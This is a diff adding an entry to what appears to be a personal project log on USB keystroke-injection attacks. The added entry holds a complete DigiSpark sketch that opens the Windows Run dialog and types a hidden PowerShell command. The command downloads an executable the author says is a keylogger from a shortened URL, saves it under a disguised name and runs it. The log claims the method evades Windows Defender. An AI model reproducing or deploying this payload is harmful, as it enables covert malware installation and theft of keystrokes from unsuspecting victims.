@@ -193,5 +193,25 @@ Works! And this method also seems to pass Windows Defender for some reason.
 
 TO DO:
 - Apply and test this with DigiSpark
+- DEMO
 
+### 25.10.2023
 
+Setting up Digispark with exactly same code as before with the ransomware app, but changing the download file link to the keylogger.exe works
+
+```
+#include <DigiKeyboardFi.h>
+
+void setup() {}
+
+void loop() {
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(100);
+  DigiKeyboardFi.print("powershell -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/yc53e7vs', \\\"$env:UserProfile/Preferences.exe\\\");Start-Process \\\"$env:UserProfile/Preferences.exe\\\" -WorkingDir \\\"$env:UserProfile/\\\"\"");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  exit(0);
+}
+```
+[PROOF](https://streamable.com/sqkbtb)
